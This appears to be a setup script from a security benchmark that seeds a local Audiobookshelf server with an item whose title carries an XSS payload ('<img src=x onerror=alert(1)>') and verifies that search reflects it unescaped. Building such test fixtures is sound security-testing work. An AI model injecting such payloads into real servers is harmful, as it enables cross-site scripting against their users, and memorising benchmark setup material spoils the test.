#!/usr/bin/env bash
# Seed one library item with HTML-bearing metadata so the task can find a
# stable reflected-XSS search vector. The stock absdatabase-base.sqlite may not include
# any such item; without this, CI fails with "no search term produced a reflected HTML response".
#
# Only run for MCB_PHASE=vulnerable: this hook runs on every phase; seeding
# during the secure phase would let the exploit observe reflection while the codebase
# check is still the vulnerable tree and would break Phase 1 expectations.
set -euo pipefail

phase_lc="$(printf '%s' "${MCB_PHASE:-}" | tr '[:upper:]' '[:lower:]')"
if [ "$phase_lc" != "vulnerable" ]; then
  echo "[prepare_app] Skipping Audiobookshelf seed (MCB_PHASE=${MCB_PHASE:-unset}, need vulnerable)"
  exit 0
fi

SERVER_URL="${ABS_SERVER_URL:-http://127.0.0.1:13378}"
USERNAME="${MCB_USERNAME:-usera}"
PASSWORD="${MCB_PASSWORD:-userAPW123}"
COMMON_PY="$(cd "$(dirname "${BASH_SOURCE[0]}")/exploit_files" && pwd)/audiobookshelf_common.py"

python3 - "$COMMON_PY" "$SERVER_URL" "$USERNAME" "$PASSWORD" <<'PY'
import importlib.util
import json
import sys
import time
from pathlib import Path

COMMON_PY, SERVER_URL, USERNAME, PASSWORD = sys.argv[1:5]
spec = importlib.util.spec_from_file_location("audiobookshelf_common", COMMON_PY)
common = importlib.util.module_from_spec(spec)
spec.loader.exec_module(common)
SEED_TITLE = "harmharmharm <img src=x onerror=alert(1)> library-title-padding"
try:
    common.wait_for_server(SERVER_URL)
    token = common.login(SERVER_URL, USERNAME, PASSWORD, timeout=60)
    libraries = common.get_libraries(SERVER_URL, token, timeout=60)
except RuntimeError as exc:
    print(f"[prepare_app] ERROR: {exc}", file=sys.stderr)
    raise SystemExit(1)
if not libraries:
    print("[prepare_app] ERROR: no libraries in server state", file=sys.stderr)
    raise SystemExit(1)

library_id = None
item_id = None
for lib in libraries:
    lid = lib.get("id")
    if not lid:
        continue
    results = common.get_items(SERVER_URL, token, lid, limit=50, timeout=60)
    if results:
        library_id = lid
        item_id = results[0].get("id")
        break

if not library_id or not item_id:
    print("[prepare_app] ERROR: no library items to seed", file=sys.stderr)
    raise SystemExit(1)

status, _patch_body, _ = common.request_json(
    SERVER_URL,
    "PATCH",
    f"/api/items/{item_id}/media",
    token=token,
    data={"metadata": {"title": SEED_TITLE}},
    timeout=60,
)
if status != 200:
    print(f"[prepare_app] ERROR: PATCH /api/items/{item_id}/media status={status}", file=sys.stderr)
    raise SystemExit(1)

# Re-scan so search indexes pick up metadata (needed on some ABS versions).
scan_status, _, _ = common.request_json(
    SERVER_URL,
    "POST",
    f"/api/items/{item_id}/scan",
    token=token,
    data={},
    timeout=60,
)
if scan_status != 200:
    print("[prepare_app] WARNING: POST /scan did not succeed (continuing)", file=sys.stderr)
time.sleep(2)

ok, preview = common.search_reflects_html(SERVER_URL, token, library_id, "harm", timeout=60)
if not ok:
    ok, preview = common.search_reflects_html(SERVER_URL, token, library_id, "audiobookshelf", timeout=60)
if not ok:
    print(
        "[prepare_app] ERROR: seeded title but search still does not reflect HTML markers. "
        f"preview={preview[:800]!r}",
        file=sys.stderr,
    )
    raise SystemExit(1)

print(
    f"[prepare_app] Seeded XSS-bearing title on item={item_id} library={library_id}"
)
PY
